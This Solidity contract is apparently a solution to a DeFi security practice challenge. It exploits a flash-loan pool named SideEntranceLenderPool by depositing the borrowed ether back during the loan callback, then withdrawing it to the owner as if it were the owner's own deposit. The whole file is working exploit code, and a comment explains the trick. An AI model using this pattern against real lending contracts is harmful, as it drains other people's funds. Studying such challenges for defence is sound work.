// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract AttackerSideEntranceReceiver is Ownable {
    using Address for address payable;

    address private _target;

    constructor(address target) {
        _target = target;
    }

    /**
     * execute is called during flash loan, which uses this loan
     * to deposit it back to pool, registering itself as depositer
     * of that much amount. And hence eligible to withdraw the same
     * amount later!
     */
    function execute() external payable {
        ISideEntranceLenderPool(_target).deposit{value: msg.value}();
    }

    function withdraw() external onlyOwner {
        ISideEntranceLenderPool(_target).withdraw();
        address owner = owner();
        payable(owner).sendValue(address(this).balance);
    }

    function initiateFlashLoan(uint256 amount) external onlyOwner {
        ISideEntranceLenderPool(_target).flashLoan(amount);
    }

    receive() external payable {}
}
